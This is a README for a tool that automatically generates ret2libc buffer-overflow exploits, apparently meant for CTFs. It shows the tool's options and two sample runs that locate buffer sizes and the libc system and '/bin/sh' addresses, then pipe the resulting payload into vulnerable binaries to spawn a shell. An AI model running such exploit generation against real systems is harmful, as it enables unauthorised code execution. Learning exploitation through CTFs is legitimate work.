# Auto-Ret2libc

Ret2libc exploits generator, for simple cases and CTFs.

## Dependencies
```bash
pip3 install -r requirements.txt
```

## Usage
```bash
$ python3 auto-ret2libc.py -h
usage: auto-ret2libc.py [-h] [-s] [-nf] [-l] [-b] file

positional arguments:
  file            The file you want to attack.

optional arguments:
  -h, --help      show this help message and exit
  -s, --stdin     The fuzzer will use stdin instead of passing an argument.
  -nf, --no-fuzz  Disables the fuzzer.
  -l , --length   Sets the maximum fuzzing length.
  -b , --buffer   Sets the buffer size to the specified value. Using this
                  option will disable the fuzzer.
```
Program expecting an argument:

```bash
$ python3 auto-ret2libc.py -l 4000 ./bof
[*] Found buffer size: 3012
[*] Found libc address: 0xf7dcb000
[*] Found libc location: /lib32/libc.so.6
[*] Found system address: 0xf7e0f5f0
[*] Found "/bin/sh" address: 0xf7f53406
[*] Found exit address: 0xf7e02360
[*] Exploit successfully created, good luck!
[+] Exploit Usage: ./bof $(cat exploit)
```

Program expecting an input (stdin):

```bash
$ python3 auto-ret2libc.py --stdin ./stack6
[*] Found buffer size: 80
[*] Found libc address: 0xf7dcb000
[*] Found libc location: /lib32/libc.so.6
[*] Found system address: 0xf7e0f5f0
[*] Found "/bin/sh" address: 0xf7f53406
[*] Found exit address: 0xf7e02360
[*] Exploit successfully created, good luck!
[+] Exploit Usage: (cat exploit; cat) | ./stack6
```
